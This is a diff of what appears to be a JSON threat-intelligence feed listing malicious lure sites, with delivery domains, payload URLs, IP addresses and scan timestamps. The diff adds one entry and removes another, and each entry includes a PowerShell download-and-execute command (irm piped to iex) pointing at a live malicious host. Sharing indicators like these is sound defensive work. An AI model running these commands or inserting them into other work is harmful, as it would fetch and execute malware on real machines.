@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "castorinvestments.pl",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/ben/1e715b77597ae0f6"
+    ],
+    "IP": [
+      "92.222.139.190"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/ben/1e715b77597ae0f6')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/ben/1e715b77597ae0f6"
+    ],
+    "ReportId": "cmwqapek9261d0omlk180kgle",
+    "ScannedAt": "2026-11-21T10:59:06.660000+00:00"
+  },
+  {
     "UrlDomain": "innvantage.skstechsolution.us",
     "DeliveryUrl": [
       "friendsoftorreabbey.com"
@@ -13495,27 +13514,5 @@
     ],
     "ReportId": "cmwdhc1qp041s0oml2r6bl190",
     "ScannedAt": "2026-11-12T11:43:40.561000+00:00"
-  },
-  {
-    "UrlDomain": "www.scaffoldingsuppliesforsale.co.uk",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "185.151.30.174"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/ebafc1c6261b57b5",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/ebafc1c6261b57b5'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/ebafc1c6261b57b5"
-    ],
-    "ReportId": "cmwdguwhj03zw0omlnorqrh3r",
-    "ScannedAt": "2026-11-12T11:30:20.446000+00:00"
   }
 ]
